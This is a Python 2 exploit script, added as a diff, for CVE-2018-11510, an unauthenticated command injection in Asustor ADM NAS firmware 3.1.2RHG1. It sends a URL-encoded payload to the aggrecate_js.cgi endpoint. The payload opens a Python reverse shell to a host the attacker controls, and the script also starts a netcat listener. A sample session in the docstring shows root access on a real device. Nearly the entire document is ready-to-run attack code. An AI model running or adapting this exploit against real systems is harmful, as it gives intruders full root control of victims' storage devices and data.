@@ -1,0 +1,95 @@
+# Title: Asustor ADM 3.1.2RHG1 - Remote Code Execution
+# Author: Matthew Fulton & Kyle Lovett
+# Date: 2018-07-01
+# Vendor Homepage: https://www.asustor.com/
+# Software Link: http://download.asustor.com/download/adm/X64_G3_3.1.2.RHG1.img
+# Version: <= ADM 3.1.2RHG1
+# Tested on: ASUSTOR AS6202T
+# CVE : CVE-2018-11510
+# References: 
+# http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11510
+
+#!/usr/bin/python
+
+"""
+CVE-2018-11510: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-11510
+This exploit takes advantage an unauthenticated os command injection discovered by Kyle Lovette 
+if exploitation occurs successfully, a root shell is granted 
+Authors: matthew fulton and Kyle Lovett
+Date: 27 May 2018
+Background: Both Kyle and I found a number of vulnerabilities that we had independently reported
+to Asustor that Asustor hasn't acknowledge nor apparenlty fixed. 
+After a twitter communication Kyle was kind enough to share a few details
+exploit created on MacOS system, python 2.7.10, may port to metasploit module soon
+Vendor link: https://www.asustor.com
+
+Matthews-MBP:remoteunauth matt$ python admex.py -t 192.168.1.82
+exploit for an unauthenticated OS command injection vulnerability that effects
+Asustor ADM 3.1.2.RHG1 and below, leads to complete compromise
+authors: Matthew Fulton (@haqur) & Kyle Lovett (@SquirrelBuddha)
+starting netcat listener on port 1234
+/bin/sh: can't access tty; job control turned off
+/volume0/usr/builtin/webman/portal/apis # uname -a;id
+/bin/sh: can't access tty; job control turned off
+/volume0/usr/builtin/webman/portal/apis # Linux AS6202T-961F 4.4.24 #1 SMP Mon Mar 26 02:57:14 CST 2018 x86_64 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root)
+"""
+
+import sys, threading, time, os, subprocess
+import urllib2
+import ssl
+import argparse
+
+
+class exploit(object):
+	def __init__(self,interval=1):
+		self.target = args.target
+		self.rport = args.port
+		self.lport = args.lport
+		self.remote = args.remote
+		self.interval = interval
+		thread = threading.Thread(target=self.run, args=())
+		thread.daemon = True
+		thread.start()
+
+	def run(self):
+		#ignore ssl warnings
+		ctx = ssl.create_default_context()
+		ctx.check_hostname = False
+		ctx.verify_mode = ssl.CERT_NONE 
+		while True:
+			try:
+				turl="https://"+self.target+":"+self.rport+"/portal/apis/aggrecate_js.cgi?script=" \
+				"launcher%22%26python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket" \
+				"(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22"+self.remote+"%22%2C"+self.lport+"))" \
+				"%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3D" \
+				"subprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27%22"
+				response=urllib2.urlopen(turl,context=ctx)
+				time.sleep(self.interval)
+			except urllib2.URLError as e:
+				print "Something is wrong:|"
+				print e
+				os._exit(1)
+
+def revShell():
+	print "starting netcat listener on port "+args.lport
+	cmd = "nc -lv {0}".format(args.lport)
+	os.system(cmd)
+
+def main():
+	print """exploit for an unauthenticated OS command injection vulnerability that effects 
+Asustor ADM 3.1.2.RHG1 and below, leads to complete compromise
+authors: Matthew Fulton (@haqur) & Kyle Lovett (@SquirrelBuddha)"""
+	goexploit = exploit()
+	revShell()
+
+if __name__ == '__main__':
+	Help = """exploitation of a OS command injection bug that effects Asustor ADM, leads to complete compromise
+	authors: Matthew Fulton (@haqur) & Kyle Lovett (@SquirrelBuddha)"""
+	parser=argparse.ArgumentParser(description=help)
+	parser.add_argument('--target', '-t', default="192.168.1.82", help="Target IP", required=True)
+	parser.add_argument('--port', '-p', default="8001")
+	parser.add_argument('--lport', '-l', default="1234")
+	parser.add_argument('--remote','-r', default="192.168.1.253")
+	args = parser.parse_args()
+	main()
